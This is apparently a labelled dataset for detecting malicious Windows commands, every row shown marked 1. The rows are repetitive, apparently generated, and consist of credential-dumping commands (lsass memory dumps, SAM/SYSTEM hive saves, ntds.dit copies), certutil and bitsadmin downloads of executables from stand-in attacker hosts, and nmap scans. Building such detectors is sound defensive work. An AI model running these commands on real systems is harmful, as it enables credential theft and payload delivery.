text,label
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
"nmap -sS -p 80,443,8080 192.168.252.184",1
certutil -urlcache -f https://temp-storage.com/p.exe,1
bitsadmin /create j,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.167.102,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -v -sn 192.168.100.88/24,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
"nmap -sS -p 445,139 192.168.210.60",1
certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -p- 192.168.221.169,1
certutil.exe -verifyctl -f http://attacker.io/x,1
bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -v -sn 192.168.165.73/24,1
certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
bitsadmin /create j,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
"nmap -sS -p 80,443,8080 192.168.77.248",1
certutil.exe -verifyctl -f http://temp-storage.com/x,1
bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -v -sn 192.168.175.109/24,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -A -T4 192.168.22.73,1
certutil -urlcache -f https://1.2.3.4/p.exe,1
bitsadmin /create j,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.206.237,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /create j,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -v -sn 192.168.135.54/24,1
certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
bitsadmin /create j,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.194.253,1
certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -sS -p 1-65535 192.168.103.94,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -p- 192.168.157.232,1
certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -v -sn 192.168.184.159/24,1
certutil -urlcache -f https://attacker.io/p.exe,1
bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -A -T4 192.168.45.101,1
certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -sS -p 1-65535 192.168.93.110,1
certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
bitsadmin /create j,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -p- 192.168.51.66,1
certutil.exe -verifyctl -f http://1.2.3.4/x,1
bitsadmin /create j,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
"nmap -sS -p 80,443,8080 192.168.38.197",1
certutil.exe -verifyctl -f http://evil-server.net/x,1
bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -sS -p 1-65535 192.168.176.84,1
certutil -urlcache -f https://1.2.3.4/p.exe,1
bitsadmin /create j,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -v -sn 192.168.92.200/24,1
certutil -urlcache -f https://temp-storage.com/p.exe,1
bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -p- 192.168.36.157,1
certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.170.251,1
certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
"nmap -sS -p 80,443,8080 192.168.254.41",1
certutil -urlcache -f https://1.2.3.4/p.exe,1
bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -A -T4 192.168.77.70,1
certutil -urlcache -f https://temp-storage.com/p.exe,1
bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -A -T4 192.168.124.249,1
certutil -urlcache -f https://attacker.io/p.exe,1
bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -p- 192.168.193.2,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /create j,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -A -T4 192.168.148.234,1
certutil.exe -verifyctl -f http://1.2.3.4/x,1
bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.154.104,1
certutil.exe -verifyctl -f http://evil-server.net/x,1
bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -A -T4 192.168.131.173,1
certutil.exe -verifyctl -f http://evil-server.net/x,1
bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.188.241,1
certutil.exe -verifyctl -f http://1.2.3.4/x,1
bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.17.210,1
certutil.exe -verifyctl -f http://evil-server.net/x,1
bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.13.40,1
certutil -urlcache -f https://temp-storage.com/p.exe,1
bitsadmin /create j,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -sS -p 3389 192.168.25.12,1
certutil.exe -verifyctl -f http://evil-server.net/x,1
bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.78.26,1
certutil.exe -verifyctl -f http://temp-storage.com/x,1
bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -A -T4 192.168.68.164,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -A -T4 192.168.52.62,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /create j,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.146.213,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -A -T4 192.168.199.178,1
certutil.exe -verifyctl -f http://1.2.3.4/x,1
bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -v -sn 192.168.92.227/24,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /create j,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -p- 192.168.175.79,1
certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -sS -p 1-65535 192.168.225.70,1
certutil -urlcache -f https://evil-server.net/p.exe,1
bitsadmin /create j,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.237.21,1
certutil.exe -verifyctl -f http://evil-server.net/x,1
bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
"nmap -sS -p 80,443,8080 192.168.191.140",1
certutil -urlcache -f https://attacker.io/p.exe,1
bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
"nmap -sS -p 80,443,8080 192.168.222.66",1
certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.236.181,1
certutil -urlcache -f https://attacker.io/p.exe,1
bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.191.33,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -v -sn 192.168.162.251/24,1
certutil -urlcache -f https://evil-server.net/p.exe,1
bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -A -T4 192.168.203.57,1
certutil -urlcache -f https://evil-server.net/p.exe,1
bitsadmin /create j,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -v -sn 192.168.40.19/24,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -p- 192.168.50.150,1
certutil -urlcache -f https://evil-server.net/p.exe,1
bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -A -T4 192.168.52.169,1
certutil -urlcache -f https://temp-storage.com/p.exe,1
bitsadmin /create j,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -A -T4 192.168.248.172,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /create j,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
